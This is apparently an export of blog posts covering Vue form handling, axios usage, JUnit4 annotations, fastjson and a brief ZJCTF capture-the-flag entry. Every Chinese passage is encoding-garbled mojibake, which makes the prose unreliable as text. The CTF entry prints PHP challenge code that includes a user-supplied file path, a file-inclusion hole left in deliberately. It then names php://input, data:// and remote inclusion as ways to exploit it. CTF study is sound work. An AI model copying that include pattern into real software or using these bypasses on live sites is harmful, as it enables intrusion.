<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      hasErrors,</span><br><span class="line">      form: <span class="built_in">this</span>.$form.createForm(<span class="built_in">this</span>, &#123; <span class="attr">name</span>: <span class="string">&#x27;getWebsocket&#x27;</span> &#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>å®˜æ–¹æ˜¯å¦‚ä¸‹è§£é‡Šçš„ï¼š</p>
<p>v-decorator æ˜¯ Ant Design çš„æ§ä»¶éªŒè¯å±æ€§ã€‚</p>
<p>ç»è¿‡ <code>getFieldDecorator</code> æˆ– <code>v-decorator</code> åŒ…è£…çš„æ§ä»¶ï¼Œè¡¨å•æ§ä»¶ä¼šè‡ªåŠ¨æ·»åŠ  <code>value</code>ï¼ˆæˆ– <code>valuePropName</code> æŒ‡å®šçš„å…¶ä»–å±æ€§ï¼‰ <code>onChange</code>ï¼ˆæˆ– <code>trigger</code> æŒ‡å®šçš„å…¶ä»–å±æ€§ï¼‰ï¼Œæ•°æ®åŒæ­¥å°†è¢« Form æ¥ç®¡ï¼Œè¿™ä¼šå¯¼è‡´ä»¥ä¸‹ç»“æœï¼š</p>
<p>ä½ ä¸å†éœ€è¦ä¹Ÿä¸åº”è¯¥ç”¨ <code>onChange</code> æ¥åšåŒæ­¥ï¼Œä½†è¿˜æ˜¯å¯ä»¥ç»§ç»­ç›‘å¬ <code>onChange</code> ç­‰äº‹ä»¶ã€‚</p>
<p>ä½ ä¸èƒ½ç”¨æ§ä»¶çš„ <code>value defaultValue</code> ç­‰å±æ€§æ¥è®¾ç½®è¡¨å•åŸŸçš„å€¼ï¼Œé»˜è®¤å€¼å¯ä»¥ç”¨ <code>getFieldDecorator</code> æˆ– <code>v-decorator</code> é‡Œçš„ initialValueã€‚</p>
<p>ä½ ä¸åº”è¯¥ç”¨ <code>v-model</code>ï¼Œå¯ä»¥ä½¿ç”¨ <code>this.form.setFieldsValue</code> æ¥åŠ¨æ€æ”¹å˜è¡¨å•å€¼ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´è¿™ç§æ–¹å¼æ˜¯å§formç”±Vueå½»åº•æ‰˜ç®¡äº†~å’Œä¹‹å‰çš„ä¸åŒï¼Œä¼šè‡ªåŠ¨åˆ¤æ–­æ˜¯å¦å­˜åœ¨å€¼ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°†ä¼šè°ƒç”¨v-decoratorã€‚å½“ç„¶è¿™ç§æ–¹å¼æˆ‘æ˜¯æ¯”è¾ƒæ¨¡ç³Šçš„ï¼ŒçœŸè¦è¯´æˆ‘æ¯”è¾ƒç†è§£çš„æ˜¯å¦å¤–ä¸€ä¸ªå½¢å¼</p>
<h2 id="11-v-modelçš„å¦™ç”¨"><a href="#11-v-modelçš„å¦™ç”¨" class="headerlink" title="11.v-modelçš„å¦™ç”¨"></a>11.v-modelçš„å¦™ç”¨</h2><p>åœ¨htmlå½“ä¸­å†™ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a-form-model-item</span> <span class="attr">style</span>=<span class="string">&quot;margin: 0px 10px 0px 00px&quot;</span> <span class="attr">class</span>=<span class="string">&quot;selectAddress&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a-input</span>  <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;logKey&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;attackAddressName&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">slot</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">type</span>=<span class="string">&quot;lock&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color:rgba(0,0,0,.25)&quot;</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">a-input</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a-form-model-item</span>&gt;</span></span><br><span class="line">                        </span><br><span class="line">                    </span><br><span class="line">                    <span class="tag">&lt;<span class="name">a-form-model-item</span> <span class="attr">class</span>=<span class="string">&quot;selectButton&quot;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">a-button</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">html-type</span>=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="tag">                            @<span class="attr">click</span>=<span class="string">&quot;selectAddress($event)&quot;</span></span></span><br><span class="line"><span class="tag">                        &gt;</span></span><br><span class="line">                            æ·»åŠ </span><br><span class="line">                        <span class="tag">&lt;/<span class="name">a-button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a-form-model-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a-alert</span> <span class="attr">message</span>=<span class="string">&quot;è¾“å…¥keyï¼Œå³å¯è‡ªåŠ¨æº¯æº&quot;</span> <span class="attr">type</span>=<span class="string">&quot;info&quot;</span> <span class="attr">class</span>=<span class="string">&quot;fontKey&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">a-spin</span> <span class="attr">size</span>=<span class="string">&quot;large&quot;</span> <span class="attr">class</span>=<span class="string">&quot;spinner&quot;</span> <span class="attr">:spinning</span>=<span class="string">&quot;spinning&quot;</span> <span class="attr">:delay</span>=<span class="string">&quot;delayTime&quot;</span> /&gt;</span></span><br><span class="line">                  </span><br></pre></td></tr></table></figure>

<p>æ³¨æ„è¿™é‡Œçš„spinningï¼Œæˆ‘ä»¬ç»™å¥¹è¿›è¡Œæ‰˜ç®¡ï¼Œå¦‚æœå¯ä»¥çš„è¯ï¼Œè€Œspinningçš„æœŸæœ›é»˜è®¤å€¼åœ¨dataå½“ä¸­æ„é€ ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">data()&#123;</span><br><span class="line">    return&#123;</span><br><span class="line">    attackAddressName:&#x27;&#x27;,</span><br><span class="line">    spinning: false,</span><br><span class="line">    delayTime: 500,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>è€Œå½“æˆ‘ä»¬ç‚¹å‡»æŒ‰é’®å‘é€æ•°æ®ä¹‹åï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">selectAddress:<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">      <span class="comment">// console.log(this.attackAddressName)</span></span><br><span class="line">      <span class="keyword">let</span> formAddress = <span class="keyword">new</span> FormData();</span><br><span class="line">      formAddress.append(<span class="string">&#x27;logname&#x27;</span>, <span class="built_in">this</span>.attackAddressName)</span><br><span class="line">      <span class="comment">// console.log(formAddress.get(&#x27;logname&#x27;))</span></span><br><span class="line">      <span class="built_in">this</span>.spinning = <span class="literal">true</span>;</span><br><span class="line">      axios.post(<span class="string">&#x27;/setting&#x27;</span>,formAddress).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> earchData =<span class="built_in">JSON</span>.parse(res.data)</span><br><span class="line">        <span class="comment">// console.log(res.data)</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">this</span>.china(earchData);</span><br><span class="line">        <span class="built_in">this</span>.spinning = <span class="literal">false</span>;</span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€æ—¦æ•°æ®æˆåŠŸå‘é€è¿‡å»ï¼Œæˆ‘ä»¬å°±å°†spinningçš„å€¼æ”¹æˆtrueï¼Œè¿™æ ·å°±å¯ä»¥æ˜¾ç¤ºäº†ï¼Œå½“è·å–æ•°æ®ä¹‹åï¼Œæˆ‘ä»¬å°±æ”¹æˆfalseï¼Œè®©ä»–æ¶ˆå¤±å³å¯</p>
<h1 id="axios-part"><a href="#axios-part" class="headerlink" title="axios part"></a>axios part</h1><h2 id="1-aioxå‘é€æ•°æ®"><a href="#1-aioxå‘é€æ•°æ®" class="headerlink" title="1.aioxå‘é€æ•°æ®"></a>1.aioxå‘é€æ•°æ®</h2><p>axiosæ˜¯ä¸€ä¸ªç»„ä»¶ï¼Œç”¨äºå‘é€æ•°æ®ç»™åç«¯ï¼Œç›¸å½“å¥½ç”¨ï¼Œæˆ‘ä»¬ä¸ºäº†é™ä½ä»£ç è€¦åˆæ€§ï¼Œåº”è¯¥æŠ“é—¨å»ºç«‹ä¸€ä¸ªaxiosæ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”è®¾ç½®ä¸€ä¸ªhttp.jsï¼Œå„ç§å„æ ·çš„è®¾ç½®æˆ‘ä»¬éƒ½åœ¨axioså½“ä¸­è¿›è¡Œé…ç½®å³å¯ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">import axios from &#x27;axios&#x27;</span><br><span class="line"></span><br><span class="line">axios.defaults.baseURL = &#x27;http://localhost:8081&#x27;;</span><br><span class="line">axios.defaults.timeout = 1000000;</span><br><span class="line">axios.defaults.withCredentials = true</span><br></pre></td></tr></table></figure>



<p>ä¾‹å¦‚è¿™æ ·ï¼Œå°±æ˜¯è®¾ç½®äº†é»˜è®¤çš„urlï¼Œè®¾ç½®è¶…æ—¶äº‹ä»¶ï¼Œå¸¦ä¸Šcookiesç­‰ç­‰ï¼Œè€Œaxiosçš„ä½¿ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œæ„é€ å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.post(<span class="string">&quot;/login&quot;</span>,formData,config).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">res.data == <span class="number">0</span> </span>)</span>&#123;</span><br><span class="line">         alert(<span class="string">&quot;è´¦å·æˆ–å¯†ç é”™è¯¯ï¼&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="built_in">this</span>.$message.success(<span class="string">` login successfully!`</span>);</span><br><span class="line">          router.push(&#123; <span class="attr">path</span>:<span class="string">&quot;/upload&quot;</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>axios.get/post</p>
<p>axios.get().theml().catch()</p>
<p>åœ¨thenå’Œcatå½“ä¸­å»å†™åˆ«çš„ä¸œè¥¿ï¼Œä¸Šå›¾å½“ä¸­çš„res.dataä¸ºAPIç»™å›æ¥çš„æ•°æ®ï¼ŒæˆåŠŸä¹‹årouter.pushå°±å¯ä»¥è®©é¡µé¢è¿›è¡Œè·³è½¬äº†</p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ„Ÿè§‰è‡ªå·±æ˜¯è¾¹å­¦è¾¹å†™çš„ï¼Œå­¦åˆ°åé¢çš„æ—¶å€™æ„Ÿè§‰ä¹‹å‰çš„ä¸œè¥¿è¿˜å¯ä»¥åšå¾—æ›´å¥½ï¼Œä½†æ˜¯è“ç‹—äº†ï¼Œå·²ç»ä¸æƒ³åŠ¨äº†orz</p>
]]></content>
      <tags>
        <tag>å¼€å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>ZJCTF,å°±è¿™ï¼Ÿ</title>
    <url>/2020/11/20/ZJCTF-%E5%B0%B1%E8%BF%99%EF%BC%9F/</url>
    <content><![CDATA[<p>ç»å…¸çš„ä»£ç å®¡è®¡ï¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ³¨æ„ç¬¬ä¸€æ­¥ï¼Œéœ€è¦æˆ‘ä»¬è¯»å–åˆ°çš„æ–‡ä»¶çš„å†…å®¹å½“ä¸­å«æœ‰I have a dreamï¼Œç„¶è€Œæ–‡ä»¶å½“ä¸­å‹æ ¹æ²¡æœ‰è¿™ä¸ªå†…å®¹ï¼Œäºæ˜¯è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿæœ‰ä¸¤ä¸ªåŠæ³•ï¼Œç¬¬ä¸€ä¸ªæ˜¯åˆ©ç”¨php://input,data://ä¼ªåè®®</p>
<p>å¦‚æœä½ ä½¿ç”¨php://input,é‚£ä¹ˆphpå°±ä¼šå»è¯»å–bodyå½“ä¸­çš„å†…å®¹ï¼Œä½ åªéœ€è¦åœ¨è¿™æ„é€ I have a dreamå³å¯ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰çš„å°±æ˜¯åˆ©ç”¨data://ä¼ªåè®®ï¼Œ</p>
<p>è¿˜æœ‰è¿œç¨‹æ–‡ä»¶åŒ…å«</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>fastJson</title>
    <url>/2020/11/02/fastJson/</url>
    <content><![CDATA[<h1 id="JUnit4"><a href="#JUnit4" class="headerlink" title="JUnit4"></a>JUnit4</h1><p>åœ¨å­¦ä¹ fastjsonä¹‹å‰ï¼Œæ„Ÿè§‰æœ‰å¿…è¦å…ˆå­¦ä¹ ä¸€ä¸‹Junit4çš„æ³¨è§£ï¼Œè‡ªä»SpringBootä¹‹åæ³¨è§£å¤§é‡çš„è¢«ä½¿ç”¨ï¼Œ</p>
<p>JUnitå‡ºç°çš„ä¸å› ä¸ºmainæ–¹æ³•æµ‹è¯•å¾ˆä¸æ–¹ä¾¿ï¼Œæ‘˜è‡ªç™¾åº¦çš„éƒ¨åˆ†ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ç”¨mainæ–¹æ³•æµ‹è¯•çš„è¯å°±å¾ˆä¸æ–¹ä¾¿ï¼Œæƒ³æµ‹è¯•å…¨éƒ¨æ–¹æ³•çš„è¯å°±å¾—æŠŠæµ‹è¯•ä»£ç å…¨éƒ¨å†™åˆ°é‡Œï¼Œæˆ–è€…ä½ æµ‹ä¸€ä¸ªé‡å†™ä¸€æ¬¡ã€‚ä¸”æ›´é‡è¦çš„æ˜¯ï¼Œè¿™æ ·ä¼šä½¿æµ‹è¯•ä»£ç ä¸è¿è¡Œé€»è¾‘ä»£ç æ··åœ¨ä¸€èµ·ï¼Œä¸è§„èŒƒã€‚</span><br><span class="line">ä½¿ç”¨junitå°±æ–¹ä¾¿å¤šäº†,è¿™æ˜¯å•å…ƒæµ‹è¯•ï¼Œä½ æƒ³æµ‹å“ªä¸ªæ–¹æ³•å°±å†™ä¸€ä¸ªå¯¹åº”çš„æµ‹è¯•æ–¹æ³•ï¼Œç„¶åç”¨junitè¿è¡Œã€‚æ¯ä¸ªæ–¹æ³•ä¹‹é—´æ˜¯ç‹¬ç«‹çš„ï¼Œéå¸¸çµæ´»ã€‚è€Œä¸”æµ‹è¯•æ–¹æ³•ä¸€èˆ¬ä¸ä¼šç›´æ¥å†™åœ¨åŸç±»ä¸­ï¼Œè€Œæ˜¯å•ç‹¬çš„æµ‹è¯•ç±»ï¼Œè¿™æ ·æµ‹è¯•ä»£ç å°±å®Œå…¨ä¸é€»è¾‘ä»£ç åˆ†å¼€äº†ã€‚	</span><br></pre></td></tr></table></figure>

<p>è€Œåœ¨Junit4å¤§é‡ä½¿ç”¨äº†ä»Java5ä¸­å¼€å§‹ä½¿ç”¨çš„æ³¨è§£ï¼Œå¦‚ä¸‹æ˜¯JUnit4å¸¸ç”¨çš„æ³¨è§£ï¼š</p>
<h2 id="beforeï¼Œtestï¼Œafter"><a href="#beforeï¼Œtestï¼Œafter" class="headerlink" title="beforeï¼Œtestï¼Œafter"></a>beforeï¼Œtestï¼Œafter</h2><ul>
<li><p>Beforeï¼šåˆå§‹åŒ–æ–¹æ³•ï¼Œé’ˆå¯¹æ¯ä¸ªæµ‹è¯•æ–¹æ³•ï¼Œéƒ½ä¼šæ‰§è¡Œä¸€é</p>
</li>
<li><p>Test: ä»£æ›¿mainå‡½æ•°ï¼Œå¯ä»¥è®©æˆ‘ä»¬çµæ´»çš„æµ‹è¯•æŸéƒ¨åˆ†ä»£ç ,æ³¨æ„ï¼Œæµ‹è¯•çš„æ—¶å€™<strong>ä¸è¦å†™ä¸€ä¸ªTestç±»ï¼ï¼ï¼ï¼</strong>ï¼Œå¦åˆ™å› ä¸ºä¼šæœ‰é™é€‰æ‹©åŒåŒ…ä¸‹çš„testç±»ï¼Œå¯¼è‡´æŠ¥é”™,@Testæ–¹æ³•æ‰€åœ¨ç±»ä¸­,<strong>ä¸èƒ½å­˜åœ¨æœ‰å‚æ•°æ„é€ å‡½æ•°,æ— å‚æ„é€ å¯ä»¥å­˜åœ¨</strong></p>
</li>
<li><p>Afterï¼šåœ¨æ–¹æ³•ç»“æŸä¹‹åæ‰§è¡Œï¼Œæ¯æ¬¡éƒ½ä¼šæ‰§è¡Œï¼</p>
</li>
</ul>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.After;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æœ€å…ˆè¢«æ‰§è¡Œï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;wdnmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ‘ä¹‹åæ‰ä¼šè¢«æ‰§è¡Œå‘¢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é™¤æ­¤ä¹‹å¤–ï¼ŒTestæ³¨è§£è¿˜å…è®¸æˆ‘ä»¬æ·»åŠ å‚æ•°ï¼Œæ£€æµ‹æ˜¯å¦æŠ›å‡ºæŸéƒ¨åˆ†å¼‚å¸¸ï¼š</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="meta">@Test(expected = Exception.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            array[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“ä»£ç å‡ºç°å¼‚å¸¸çš„æ—¶å€™ï¼Œåˆ™ä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œç›¸åçš„ï¼Œå¦‚æœè¿™æ®µä»£ç æ­£å¸¸æŠ›å‡ºï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸äº†ã€‚</p>
<h2 id="beforeclassï¼Œafterclass"><a href="#beforeclassï¼Œafterclass" class="headerlink" title="beforeclassï¼Œafterclass"></a>beforeclassï¼Œafterclass</h2><ul>
<li>BeforeClass: åœ¨æ‰€æœ‰ç±»è¢«æ‰§è¡Œä¹‹å‰æ‰§è¡Œï¼Œåªä¼šæ‰§è¡Œä¸€æ¬¡ï¼ŒåŒæ—¶å¿…é¡»ä¸ºstaticé™æ€æ–¹æ³•ï¼ˆå› ä¸ºä»–ä»¬å°±ç›¸å½“äºæ­¤ï¼‰</li>
<li>AfterClass: åœ¨æ‰€æœ‰ç±»è¢«æ‰§è¡Œä¹‹åæ‰§è¡Œ</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ‘å°±ç›¸å½“äºæ„é€ å™¨ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ‘æ˜¯test1ï¼Œæˆ‘è¢«æ‰§è¡Œäº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ‘ä¹‹åæ‰ä¼šè¢«æ‰§è¡Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test(expected = Exception.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            array[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ‘æ˜¯test2æ‰§è¡Œäº†ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@BeforeClass</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">beforeClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ‘åœ¨æ‰€æœ‰çš„å‰é¢è¢«æ‰§è¡Œï¼Œå¹¶ä¸”æˆ‘åªä¼šæ‰§è¡Œä¸€æ¬¡ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterClass</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">afterClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ‘åœ¨æœ€ç»ˆæ‰€æœ‰ç»“æŸä¹‹åæ‰ä¼šè¢«æ‰§è¡Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Ignore"><a href="#Ignore" class="headerlink" title="Ignore"></a>Ignore</h2><ul>
<li>Ignoreå¯ä»¥è®©æˆ‘ä»¬æš‚æ—¶çš„ç¦ç”¨ç‰¹å®šçš„ç±»ï¼Œè¢«æ³¨è§£ä¹‹åçš„ç±»å°†ä¸å†è¢«æ‰§è¡Œ</li>
</ul>
<p>Ignoreç»è¿‡æˆ‘æµ‹è¯•ï¼Œåªæœ‰å½“ä»–æ”¾åœ¨æµ‹è¯•ç±»å‰æ‰å¯ä»¥ç”Ÿæ•ˆã€‚</p>
<p>ä¾‹å­ï¼š</p>
<p><img src="image-20201102165311512.png" alt="image-20201102165311512"></p>
<p>è€Œå¦‚æœæˆ‘ä»¬æ”¾åœ¨å…¶ä»–ç±»å‰é¢ï¼š</p>
<p><img src="image-20201102165351821.png" alt="image-20201102165351821"></p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°ä¾ç„¶è¢«æ‰§è¡Œäº†ï¼</p>
<h2 id="Runwith"><a href="#Runwith" class="headerlink" title="Runwith"></a>Runwith</h2><ul>
<li>Runwithæ”¾åœ¨æµ‹è¯•ç±»ä¹‹å‰ï¼Œç”¨äºç¡®å®šè¿™ä¸ªç±»è¯¥å¦‚ä½•è¿è¡Œï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸æ ‡æ³¨ï¼Œå°†ä¼šä½¿ç”¨é»˜è®¤çš„è¿è¡Œå®¹å™¨</li>
</ul>
<p>å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« æ¥ç†è§£ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;my.oschina.net&#x2F;itblog&#x2F;blog&#x2F;1550753?tdsourcetag&#x3D;s_pcqq_aiomsg</span><br></pre></td></tr></table></figure>



<h1 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h1><ul>
<li><p>Fastjson æ˜¯ä¸€ä¸ª Java åº“ï¼Œå¯ä»¥å°† Java å¯¹è±¡è½¬æ¢ä¸º JSON æ ¼å¼ï¼Œå½“ç„¶å®ƒä¹Ÿå¯ä»¥å°† JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º Java å¯¹è±¡ã€‚</p>
</li>
<li><p>Fastjson å¯ä»¥æ“ä½œä»»ä½• Java å¯¹è±¡ï¼Œå³ä½¿æ˜¯ä¸€äº›é¢„å…ˆå­˜åœ¨çš„æ²¡æœ‰æºç çš„å¯¹è±¡ã€‚</p>
</li>
<li><p>Fastjson æºç åœ°å€ï¼š<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p>
</li>
<li><p>Fastjson ä¸­æ–‡ Wikiï¼š<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p>
</li>
<li><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œç¨‹åºå‘˜ä»¬ç”¨è¿™ä¸ªç¨‹åºå°±æ˜¯ä¸ºäº†ä¼ è¿JSONæ ¼å¼çš„å¯¹è±¡ï¼Œå‘ƒï¼Œæ„Ÿè§‰åƒåºåˆ—åŒ–ä¸€æ ·äº†ï¼Ÿ</p>
</li>
</ul>
